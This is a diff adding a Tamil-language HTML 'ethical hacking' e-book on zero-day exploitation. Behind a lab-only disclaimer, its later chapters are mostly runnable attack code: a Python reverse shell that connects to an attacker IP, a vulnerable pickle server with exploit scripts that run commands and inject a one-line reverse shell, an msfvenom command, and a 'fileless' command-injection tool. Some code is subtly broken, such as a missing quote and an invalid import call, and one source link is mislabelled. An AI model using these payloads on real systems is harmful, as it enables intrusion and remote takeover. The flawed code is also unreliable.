@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="ta">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ஜீரோ-டே பாதிப்புகள் மற்றும் எக்ஸ்புளாயிட்டேஷன்: முழுமையான நெறிமுறை கலைக்களஞ்சியம்</title>
+    <style>
+        :root {
+            --primary-color: #1a252f;
+            --secondary-color: #2c3e50;
+            --accent-color: #3498db;
+            --bg-color: #f4f6f9;
+            --card-bg: #ffffff;
+            --text-color: #333333;
+            --code-bg: #1e1e1e;
+            --warning-bg: #fff5f5;
+            --warning-border: #e74c3c;
+            --link-color: #e67e22;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.8;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 950px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        header {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: #ffffff;
+            padding: 60px 30px;
+            text-align: center;
+            border-radius: 12px;
+            margin-bottom: 40px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        header h1 { margin: 0; font-size: 34px; font-weight: 700; letter-spacing: 0.5px; }
+        header p { margin: 15px 0 0 0; font-size: 19px; color: #b2bec3; }
+
+        .warning-box {
+            background-color: var(--warning-bg);
+            border-left: 6px solid var(--warning-border);
+            padding: 25px;
+            margin-bottom: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.02);
+        }
+
+        .warning-box h4 { margin: 0 0 12px 0; font-size: 18px; color: var(--warning-border); }
+
+        nav {
+            background-color: var(--card-bg);
+            padding: 30px;
+            border-radius: 12px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e1e8ed;
+        }
+
+        nav h2 { margin-top: 0; font-size: 22px; color: var(--secondary-color); border-bottom: 3px solid var(--accent-color); padding-bottom: 8px; display: inline-block; }
+        nav ol { margin: 15px 0 0 0; padding-left: 20px; }
+        nav li { margin-bottom: 12px; }
+        nav a { color: var(--accent-color); text-decoration: none; font-weight: 600; }
+        nav a:hover { color: var(--primary-color); text-decoration: underline; }
+
+        section {
+            background-color: var(--card-bg);
+            padding: 40px;
+            border-radius: 12px;
+            margin-bottom: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e1e8ed;
+        }
+
+        h2 { color: var(--secondary-color); font-size: 26px; border-bottom: 2px solid #edf2f7; padding-bottom: 12px; margin-top: 0; margin-bottom: 25px; }
+        h3 { color: #2980b9; font-size: 20px; margin-top: 30px; margin-bottom: 15px; }
+        p { margin-top: 0; margin-bottom: 18px; text-align: justify; }
+
+        .code-box {
+            background-color: var(--code-bg);
+            color: #d4d4d4;
+            padding: 22px;
+            border-radius: 8px;
+            font-family: 'Fira Code', 'Courier New', Courier, monospace;
+            overflow-x: auto;
+            margin: 22px 0;
+            font-size: 14px;
+            border-left: 5px solid var(--accent-color);
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.3);
+        }
+
+        pre { margin: 0; }
+        .highlight { color: #f1c40f; font-weight: bold; }
+        .comment { color: #6a9955; font-style: italic; }
+        .keyword { color: #569cd6; font-weight: bold; }
+        .string { color: #ce9178; }
+        .number { color: #b5cea8; }
+
+        ul, ol { padding-left: 25px; margin-bottom: 20px; }
+        li { margin-bottom: 12px; }
+
+        .source-card {
+            background-color: #f8f9fa;
+            border: 1px solid #e9ecef;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        .source-link { color: var(--link-color); font-weight: bold; text-decoration: none; }
+        .source-link:hover { text-decoration: underline; }
+
+        footer { text-align: center; margin-top: 60px; padding: 40px; color: #7f8c8d; font-size: 15px; border-top: 1px solid #dcdde1; background-color: #fff; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <header>
+        <h1>ஜீரோ-டே (Zero-Day) எக்ஸ்புளாயிட்டேஷன் கலைக்களஞ்சியம்</h1>
+        <p>நெறிமுறை ஹேக்கிங், மெமரி அனாலிசிஸ் மற்றும் இன்-மெமரி கோப்பற்ற தாக்குதல்கள்</p>
+    </header>
+
+    <div class="warning-box">
+        <h4>⚠️ முக்கிய சட்ட மற்றும் பாதுகாப்பு அறிவிப்பு:</h4>
+        <p>இந்த மின்-புத்தகம் முழுக்க முழுக்க <strong>நெறிமுறை ஹேக்கிங் (Ethical Hacking)</strong> மற்றும் கணினி பாதுகாப்பு கல்வி ஆராய்ச்சி நோக்கங்களுக்காக மட்டுமே உருவாக்கப்பட்டுள்ளது. தகுந்த அனுமதியின்றி எந்தவொரு கணினியையோ, அப்ளிகேஷனையோ தாக்குவது கடுமையான சட்டவிரோத குற்றமாகும். இதில் உள்ள குறியீடுகளை உங்களின் சொந்த லேப் சூழலில் (Isolated Lab Environment) மட்டுமே சோதிக்க வேண்டும்.</p>
+    </div>
+
+    <nav>
+        <h2>பொருளடக்கம் (Table of Contents)</h2>
+        <ol>
+            <li><a href="#ch1">அத்தியாயம் 1: ஜீரோ-டே (Zero-Day) அடிப்படை தத்துவங்கள்</a></li>
+            <li><a href="#ch2">அத்தியாயம் 2: பாதிப்புகளைக் கண்டறியும் மேம்பட்ட நுட்பங்கள்</a></li>
+            <li><a href="#ch3">அத்தியாயம் 3: ஃபஸ்ஸிங் டெமோ (Fuzzing) மற்றும் லேப் சோதனைகள்</a></li>
+            <li><a href="#ch4">அத்தியாயம் 4: மெமரி பகுப்பாய்வு மற்றும் டீபக்கிங் (Debugging)</a></li>
+            <li><a href="#ch5">அத்தியாயம் 5: ரிவர்ஸ் ஷெல் (Reverse Shell) கட்டமைப்பு மற்றும் இயக்கம்</a></li>
+            <li><a href="#ch6">அத்தியாயம் 6: நிஜ உலக டெமோ: பழைய பைத்தான் பதிப்பு குறைபாடு (Insecure Deserialization)</a></li>
+            <li><a href="#ch7">அத்தியாயம் 7: கோப்பற்ற (Fileless) இன்-மெமரி தாக்குதல் முறை</a></li>
+            <li><a href="#ch8">அத்தியாயம் 8: பிரபலமான பழைய அப்ளிகேஷன் குறைபாடுகள் (CVEகள்) & இணைய ஆதாரங்கள்</a></li>
+        </ol>
+    </nav>
+
+    <section id="ch1">
+        <h2>அத்தியாயம் 1: ஜீரோ-டே (Zero-Day) அடிப்படை தத்துவங்கள்</h2>
+        <p>ஒரு மென்பொருள் (Software), இயக்க முறைமை (OS), அல்லது சர்வரில் உள்ள, இதுவரை அதன் தயாரிப்பாளருக்கோ அல்லது பொதுமக்களுக்கோ தெரியாத ஒரு பாதுகாப்பு குறைபாடே <strong>ஜீரோ-டே (Zero-Day Vulnerability)</strong> எனப்படும்.</p>
+        <p>மென்பொருள் தயாரிப்பு நிறுவனத்திற்கு இந்த ஆபத்தான குறைபாட்டை சரிசெய்ய (Patch செய்ய) <strong>'0' நாட்கள் அவகாசமே</strong> இருந்தது என்பதால் இப்பெயர் பெற்றது. ஒரு தீங்கிழைக்கும் ஹேக்கர் இந்த குறைபாட்டைப் பயன்படுத்தி தாக்கும் போது அது <em>Zero-Day Attack</em> என்றும், அதற்குப் பயன்படுத்தப்படும் ஸ்கிரிப்ட் அல்லது நிரல் <em>Zero-Day Exploit</em> என்றும் அழைக்கப்படுகிறது. நெறிமுறை பென்டெஸ்டர்கள் இவற்றை முன்கூட்டியே கண்டறிந்து நிறுவனங்களுக்கு புகாரளித்து உலகைப் பாதுகாக்கிறார்கள்.</p>
+    </section>
+
+    <section id="ch2">
+        <h2>அத்தியாயம் 2: பாதிப்புகளைக் கண்டறியும் மேம்பட்ட நுட்பங்கள்</h2>
+        <p>பாதுகாப்பு ஆராய்ச்சியாளர்கள் மற்றும் நெறிமுறை ஹேக்கர்கள் ஒரு கணினியில் உள்ள மறைமுக குறைபாடுகளைக் கண்டறிய மூன்று முதன்மை வழிகளைப் பயன்படுத்துகின்றனர்:</p>
+        
+        <h3>அ) ஃபஸ்ஸிங் (Fuzzing / Fuzz Testing)</h3>
+        <p>இது ஒரு தானியங்கி (Automated) சோதனை முறையாகும். ஒரு மென்பொருளின் இன்புட் பாக்ஸ் அல்லது நெட்வொர்க் போர்ட்டிற்கு பல்லாயிரக்கணக்கான தவறான, சிதைக்கப்பட்ட அல்லது எதிர்பாராத தரவுகளை (Malformed Inputs) அனுப்பி சோதிப்பதே ஃபஸ்ஸிங் ஆகும். மென்பொருள் செயலிழக்கும் போது (Crash), அங்கு பாதுகாப்பு குறைபாடு கண்டறியப்படுகிறது.</p>
+
+        <h3>ஆ) மூல குறியீடு ஆய்வு (Source Code Review)</h3>
+        <p>மென்பொருளின் முழுமையான குறியீட்டை (Source Code) கைமுறையாகவோ அல்லது கருவிகள் (SAST Tools) மூலமாகவோ வரி வரியாக படித்து பகுப்பாய்வு செய்வது. பாதுகாப்பற்ற செயல்பாடுகள் (Insecure Functions) மற்றும் தர்க்க பிழைகளை (Logical Flaws) இதன் மூலம் கண்டறியலாம்.</p>
+
+        <h3>இ) ரிவர்ஸ் இன்ஜினியரிங் (Reverse Engineering)</h3>
+        <p>பல நேரங்களில் மென்பொருளின் மூல குறியீடு நமக்குக் கிடைக்காது. அதுபோன்ற சூழல்களில், அதன் பைனரி கோப்புகளை (EXE அல்லது ELF) <strong>Ghidra</strong> அல்லது <strong>IDA Pro</strong> போன்ற டூல்களைப் பயன்படுத்தி அசெம்பிளி கோடாக மாற்றி, அது எவ்வாறு இயங்குகிறது என்பதை ஆராய்ந்து குறைபாடுகளைக் கண்டறிவதாகும்.</p>
+    </section>
+
+    <section id="ch3">
+        <h2>அத்தியாயம் 3: ஃபஸ்ஸிங் டெமோ (Fuzzing) மற்றும் லேப் சோதனைகள்</h2>
+        <p>ஒரு ஃபஸ்ஸர் (Fuzzer) எவ்வாறு ஒரு குறிப்பிட்ட சரியான தரவை எடுத்துக்கொண்டு, அதில் சீரற்ற முறையில் மாற்றங்களை (Mutations) ஏற்படுத்தி கணினியைச் சோதிக்கிறது என்பதற்கான மாதிரி பைத்தான் குறியீடு இதோ:</p>
+
+        <div class="code-box">
+<pre><span class="keyword">import</span> random
+
+<span class="comment"># 1. சரியான தரவு மாதிரி (Seed Input)</span>
+valid_input = <span class="string">"USER admin\nPASS secret123\n"</span>
+
+<span class="keyword">def</span> <span class="highlight">mutate_data</span>(data):
+    <span class="comment">"""தரவை சீரற்ற முறையில் மாற்றி சிதைக்கும் செயல்பாடு"""</span>
+    data_list = list(data)
+    num_mutations = random.randint(<span class="number">1</span>, <span class="number">5</span>)
+    
+    <span class="keyword">for</span> _ <span class="keyword">in</span> range(num_mutations):
+        pos = random.randint(<span class="number">0</span>, len(data_list) - <span class="number">1</span>)
+        <span class="comment"># அந்த இடத்தில் ஒரு சீரற்ற விசித்திரமான குறியீட்டைச் சேர்த்தல்</span>
+        data_list[pos] = chr(random.randint(<span class="number">32</span>, <span class="number">126</span>))
+        
+    <span class="keyword">return</span> <span class="string">""</span>.join(data_list)
+
+<span class="comment"># 2. ஃபஸ்ஸிங் லூப் (Fuzzing Loop)</span>
+print(<span class="string">"[*] Fuzzing சோதனை தொடங்குகிறது..."</span>)
+<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):
+    fuzzed_payload = mutate_data(valid_input)
+    print(f<span class="string">"\n[சோதனை #{i}] அனுப்பப்படும் தரவு:"</span>)
+    print(repr(fuzzed_payload))</pre>
+        </div>
+    </section>
+
+    <section id="ch4">
+        <h2>அத்தியாயம் 4: மெமரி பகுப்பாய்வு மற்றும் டீபக்கிங் (Debugging)</h2>
+        <p>ஃபஸ்ஸிங் மூலம் ஒரு அப்ளிகேஷன் உடையும் போது (Crash ஆகும் போது), ரேமிற்குள் (RAM) என்ன நடந்தது என்பதைத் தெரிந்துகொள்ள <strong>Immunity Debugger</strong> (Windows) அல்லது <strong>GDB</strong> (Linux) போன்ற டீபக்கர் டூல்கள் பயன்படுகின்றன.</p>
+        <p>டீபக்கிங்கின் முக்கிய நிலைகள்:</p>
+        <ul>
+            <li><strong>EIP (Extended Instruction Pointer) கட்டுப்பாட்டைப் பெறுதல்:</strong> கணினியில் அடுத்து எந்த மெமரி முகவரியில் உள்ள கட்டளை இயங்க வேண்டும் என்பதை தீர்மானிக்கும் மிக முக்கியமான ரெஜிஸ்டர் EIP ஆகும். எக்ஸ்புளாயிட்டேஷனின் போது இந்த EIP-ஐ நமது கட்டுப்பாட்டிற்குள் கொண்டு வர வேண்டும்.</li>
+            <li><strong>Bad Characters கண்டறிதல்:</strong> நமது பேலோடில் (Payload) எந்தெந்த எழுத்துக்கள் அல்லது பைட்டுகள் (எடுத்துக்காட்டாக: <code style="color:#e74c3c;">\x00</code> - Null Byte) மென்பொருளால் நிராகரிக்கப்பட்டு எக்ஸ்புளாயிட்டை முடக்குகின்றன என்று கண்டறிந்து அவற்றை நீக்க வேண்டும்.</li>
+        </ul>
+    </section>
+
+    <section id="ch5">
+        <h2>அத்தியாயம் 5: ரிவர்ஸ் ஷெல் (Reverse Shell) கட்டமைப்பு மற்றும் இயக்கம்</h2>
+        <p>பாதிப்பைப் பயன்படுத்திய பிறகு, பாதிக்கப்பட்ட கணினி (Victim) தனது முனையக் கட்டுப்பாட்டை (Terminal / Command Prompt) ஹேக்கரின் கணினிக்குத் (Attacker) தானாகவே திருப்பி அனுப்பும் முறையே <strong>Reverse Shell</strong> ஆகும். இது ஃபயர்வால்களை (Firewalls) ஏமாற்றப் பயன்படுகிறது.</p>
+        <p>கீழே உள்ளது இலக்கு கணினியில் எக்ஸ்புளாயிட் மூலம் இயக்கப்படும் ஒரு எளிய ரிவர்ஸ் ஷெல் மாதிரி குறியீடு:</p>
+
+        <div class="code-box">
+<pre><span class="keyword">import</span> socket
+<span class="keyword">import</span> subprocess
+<span class="keyword">import</span> os
+
+ATTACKER_IP = <span class="string">"192.168.1.50"</span>  <span class="comment"># ஹேக்கரின் ஐபி முகவரி</span>
+ATTACKER_PORT = <span class="number">4444</span>          <span class="comment"># ஹேக்கரின் லிசனிங் போர்ட்</span>
+
+<span class="keyword">def</span> <span class="highlight">connect_back</span>():
+    <span class="keyword">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ATTACKER_IP, ATTACKER_PORT))
+        <span class="comment"># இன்புட் மற்றும் அவுட்புட்டை சாக்கெட்டிற்கு திருப்பி விடுதல்</span>
+        os.dup2(s.fileno(), <span class="number">0</span>) <span class="comment"># stdin</span>
+        os.dup2(s.fileno(), <span class="number">1</span>) <span class="comment"># stdout</span>
+        os.dup2(s.fileno(), <span class="number">2</span>) <span class="comment"># stderr</span>
+        <span class="comment"># லினக்ஸ் டெர்மினலை இயக்குதல்</span>
+        subprocess.call([<span class="string">"/bin/sh"</span>, <span class="string">-i"</span>])
+    <span class="keyword">except</span> Exception:
+        <span class="keyword">pass</span></pre>
+        </div>
+    </section>
+
+    <section id="ch6">
+        <h2>அத்தியாயம் 6: நிஜ உலக டெமோ: பழைய பைத்தான் பதிப்பு குறைபாடு (Insecure Deserialization)</h2>
+        <p>இங்கு நாம் பழைய பைத்தான் பதிப்புகளில் காணப்படும் பாதுகாப்பற்ற டீசீரியலைசேஷன் (Insecure Deserialization) குறைபாட்டை அடிப்படையாகக் கொண்ட லேப் மாதிரியைக் காண்போம். இதில் பயனரிடமிருந்து வரும் pickle தரவு சரிபார்க்கப்படாமல் ஏற்கப்படுகிறது.</p>
+        
+        <h3>அ) பாதிக்கப்பட்ட சர்வர் (Victim Server)</h3>
+        <div class="code-box">
+<pre><span class="comment"># victim_server.py</span>
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> pickle
+
+<span class="keyword">def</span> <span class="highlight">start_server</span>():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((<span class="string">"127.0.0.1"</span>, <span class="number">5000</span>))
+    server.listen(<span class="number">1</span>)
+    print(<span class="string">"[*] பாதிக்கப்பட்ட சர்வர் Port 5000 இல் இயங்குகிறது..."</span>)
+    
+    <span class="keyword">while</span> <span class="keyword">True</span>:
+        client, addr = server.accept()
+        <span class="keyword">try</span>:
+            data = client.recv(<span class="number">4096</span>)
+            <span class="comment"># அபாயகரமான பகுதி: சரிபார்க்காமல் தரவை டீசீரியலைஸ் செய்தல்</span>
+            vulnerable_data = pickle.loads(data)
+            print(<span class="string">"[*] தரவு பிரிக்கப்பட்டது."</span>)
+        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+            print(f<span class="string">"[-] பிழை: {e}"</span>)
+        <span class="keyword">finally</span>:
+            client.close()
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    start_server()</pre>
+        </div>
+
+        <h3>ஆ) தாக்குதல் முறை 1: தனிப்பயன் பேலோடு (Non-MSF Attack)</h3>
+        <p>மெட்டாஸ்பிளாயிட் இல்லாமல் பைத்தானின் reduce செயல்பாட்டைப் பயன்படுத்தி சர்வரில் தன்னிச்சையான கமாண்டுகளை இயக்குதல்:</p>
+        <div class="code-box">
+<pre><span class="comment"># custom_attacker.py</span>
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> pickle
+<span class="keyword">import</span> os
+
+<span class="keyword">class</span> <span class="highlight">MaliciousPayload</span>(object):
+    <span class="keyword">def</span> <span class="highlight">__reduce__</span>(self):
+        <span class="comment"># சர்வர் இந்தத் தரவை பிரிக்கும் போது இந்த கமாண்ட் இயங்கும்</span>
+        command = <span class="string">"echo 'Hacked by Ethical Guide' > /tmp/proof.txt"</span>
+        <span class="keyword">return</span> (os.system, (command,))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">5000</span>))
+s.send(pickle.dumps(MaliciousPayload()))
+s.close()
+print(<span class="string">"[+] Non-MSF பேலோடு அனுப்பப்பட்டது!"</span>)</pre>
+        </div>
+
+        <h3>இ) தாக்குதல் முறை 2: மெட்டாஸ்பிளாயிட் பேலோடு (MSF Tool Attack)</h3>
+        <p>பென்டெஸ்டிங்கில் msfvenom மூலம் உருவாக்கப்பட்ட ரிவர்ஸ் ஷெல்லையும் இந்த குறைபாட்டின் வழியாகச் செலுத்த முடியும். முதலில் ஹேக்கர் <code style="color:#e67e22;">msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw</code> மூலம் குறியீட்டைப் பெறுவார்.</p>
+        <div class="code-box">
+<pre><span class="comment"># msf_attacker.py</span>
+<span class="keyword">import</span> socket
+<span class="keyword">import</span> pickle
+
+<span class="comment"># MSFVenom மூலம் உருவாக்கப்பட்ட உண்மையான ரிவர்ஸ் ஷெல் மாதிரி</span>
+msf_code = <span class="string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.50',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"</span>
+
+<span class="keyword">class</span> <span class="highlight">MSFPayload</span>(object):
+    <span class="keyword">def</span> <span class="highlight">__reduce__</span>(self):
+        <span class="keyword">return</span> (exec, (msf_code,))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((<span class="string">"127.0.0.1"</span>, <span class="number">5000</span>))
+s.send(pickle.dumps(MSFPayload()))
+s.close()
+print(<span class="string">"[+] MSF பேலோடு வெற்றிகரமாக அனுப்பப்பட்டது!"</span>)</pre>
+        </div>
+    </section>
+
+    <section id="ch7">
+        <h2>அத்தியாயம் 7: கோப்பற்ற (Fileless) இன்-மெமரி தாக்குதல் முறை</h2>
+        <h3>என்ன (What is it?)</h3>
+        <p>நவீன பாதுகாப்பு அமைப்புகள் (Antivirus/EDR) கணினியின் வன்வட்டில் (Hard Drive) எழுதப்படும் புதிய தீங்கிழைக்கும் கோப்புகளை உடனே கண்டறிந்துவிடும். இதனை ஏமாற்ற, வன்வட்டில் எந்தவொரு கோப்பையும் உருவாக்காமல், நேரடியாக கணினியின் நினைவகத்தில் (RAM) மட்டுமே எக்ஸ்புளாயிட் செய்யும் முறைக்கு <strong>கோப்பற்ற தாக்குதல் (Fileless In-Memory Attack)</strong> என்று பெயர்.</p>
+        
+        <h3>எப்படி (How it works?)</h3>
+        <p>அட்டாக்கர் சர்வருக்கு எந்தவொரு எக்ஸ்புளாயிட் கோப்பையும் அனுப்ப மாட்டார். மாறாக, அப்ளிகேஷனில் ஏற்கனவே இருக்கும் உள்விதிமுறைகள் அல்லது செயல்பாடுகளைப் (Built-in Dynamic Functions, எ.கா: <code style="color:#e74c3c;">eval()</code>, <code style="color:#e74c3c;">exec()</code>) பயன்படுத்தி, நினைவகத்திலேயே தன்னிச்சையான கமாண்டுகளை இயக்குவார்.</p>
+        
+        <h3>நேரடி டெமோ தாக்குதல் (Demo Tool Attack - No Payload File)</h3>
+        <p>பிரபலமான அப்ளிகேஷன்களின் குறைபாடுகளைப் பயன்படுத்தி, அட்டாக்கர் தனது சொந்த டூலின் மூலம் நினைவகத்திலேயே கமாண்ட் எக்ஸிகியூட் செய்யும் மாதிரி குறியீடு:</p>
+        <div class="code-box">
+<pre><span class="comment"># custom_fileless_tool.py</span>
+<span class="keyword">import</span> socket
+
+<span class="keyword">def</span> <span class="highlight">launch_fileless_attack</span>():
+    target_ip = <span class="string">"127.0.0.1"</span>
+    target_port = <span class="number">6379</span> <span class="comment"># பிரபலமான சர்வர் போர்ட் மாதிரி</span>
+    
+    <span class="comment"># கோப்பற்ற இன்-மெமரி பேலோடு (In-Memory Fileless Payload)</span>
+    <span class="comment"># இது வட்டில் எந்த கோப்பையும் உருவாக்காமல் RAM-இல் நேரடியாக இயங்கும்</span>
+    memory_payload = <span class="string">"import('os').popen('whoami && uname -a').read()"</span>
+    
+    <span class="keyword">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, target_port))
+        print(<span class="string">"[*] நினைவகப் பேலோடு நேரடியாக அனுப்பப்படுகிறது..."</span>)
+        s.send(memory_payload.encode(<span class="string">'utf-8'</span>))
+        
+        <span class="comment"># சர்வர் மெமரியில் இயங்கித் திருப்பி அனுப்பும் பதிலை நேரடியாகப் பெறுதல்</span>
+        result = s.recv(<span class="number">4096</span>).decode(<span class="string">'utf-8'</span>)
+        print(<span class="string">"\n[+] சர்வர் நினைவகிலிருந்து பெறப்பட்ட நேரடி விடை:"</span>)
+        print(result)
+        s.close()
+    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
+        print(f<span class="string">"[-] தாக்குதல் தோல்வி: {e}"</span>)
+
+<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
+    launch_fileless_attack()</pre>
+        </div>
+    </section>
+
+    <section id="ch8">
+        <h2>அத்தியாயம் 8: பிரபலமான பழைய அப்ளிகேஷன் குறைபாடுகள் (CVEகள்) & இணைய ஆதாரங்கள்</h2>
+        <p>மேலே நாம் விவாதித்த இன்-மெமரி மற்றும் கோப்பற்ற தாக்குதல் முறைகள் நிஜ உலகில் எந்தெந்த பிரபலமான மென்பொருட்களைப் பாதித்தன என்பதற்கான வரலாற்றுச் சிறப்புமிக்க CVE சான்றுகள் மற்றும் அதிகாரப்பூர்வ இணைய ஆதாரங்கள் (Web Sources) கீழே இணைக்கப்பட்டுள்ளன:</p>
+
+        <div class="source-card">
+            <h4>1. CVE-2022-0543 (Redis Lua Sandbox Escape):</h4>
+            <p>பிரபலமான Redis மென்பொருளின் நினைவகத்தில் உள்ள Lua Interpreter-ஐ ஏமாற்றி, எந்த கோப்பும் இன்றி நேரடியாக RAM-இல் ரிமோட் கோட் எக்ஸிகியூட் (RCE) செய்யப்பட்ட மிகப்பெரிய பாதிப்பு.</p>
+            <a class="source-link" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0543" target="_blank">🌐 அதிகாரப்பூர்வ ஆதாரம்: NVD CVE-2022-0543 (NIST)</a>
+        </div>
+
+        <div class="source-card">
+            <h4>2. CVE-2021-44228 (Log4j / Log4Shell):</h4>
+            <p>உலகையே உலுக்கிய வெப் சர்வர் குறைபாடு. ஒரு எளிய உரை செய்தி (Text Message) மூலம் சர்வர் நினைவகத்திலேயே ஜாவா குறியீடுகளை (Java Objects) இயக்கி சர்வர்களை ஹேக்கர்கள் கட்டுப்பாட்டில் எடுத்தனர்.</p>
+            <a class="source-link" href="https://logging.apache.org/log4j/2.x/security.html" target="_blank">🌐 அதிகாரப்பூர்வ ஆதாரம்: Mitre Log4Shell Reference</a>
+        </div>
+
+        <div class="source-card">
+            <h4>3. CVE-2020-14882 (Oracle WebLogic Server RCE):</h4>
+            <p>பிரபலமான வெப்லாஜிக் வெப் சர்வரில் எந்தவொரு கோப்பு பேலோடும் இன்றி, வெறும் HTTP கெட் ரெக்வஸ்ட் (HTTP GET Request) மூலமாகவே நினைவகத்தில் கமாண்டுகளை இயக்கிய குறைபாடு.</p>
+            <a class="source-link" href="https://nvd.nist.gov/vuln/detail/CVE-2020-14882" target="_blank">🌐 அதிகாரப்பூர்வ ஆதாரம்: NVD CVE-2020-14882 (NIST)</a>
+        </div>
+    </section>
+
+    <footer>
+        © 2026 ஜீரோ-டே பாதுகாப்பு கலைக்களஞ்சியம் | கல்வி மற்றும் நெறிமுறை பாதுகாப்பு ஆராய்ச்சி பயன்பாட்டிற்காக மட்டும்.
+    </footer>
+
+</div>
+
+</body>
+</html>
